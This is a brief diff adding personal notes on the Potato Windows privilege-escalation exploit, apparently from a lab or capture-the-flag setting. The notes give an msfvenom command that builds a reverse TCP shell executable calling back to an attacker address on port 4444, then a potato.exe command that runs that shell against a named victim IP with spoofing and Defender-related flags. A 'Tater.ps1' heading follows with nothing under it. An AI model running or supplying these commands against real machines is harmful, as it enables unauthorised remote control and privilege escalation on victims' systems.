@@ -1,0 +1,10 @@
+potato.exe Instructions
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.2.43.23 LPORT=4444 -f exe > shell.exe
+
+potato.exe -ip 10.10.80.141 -cmd "C:\Users\user\Desktop\shell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+                ^ victim IP
+The -ip should be the victims IP. Not yours.
+
+Tater.ps1 Instructions
+
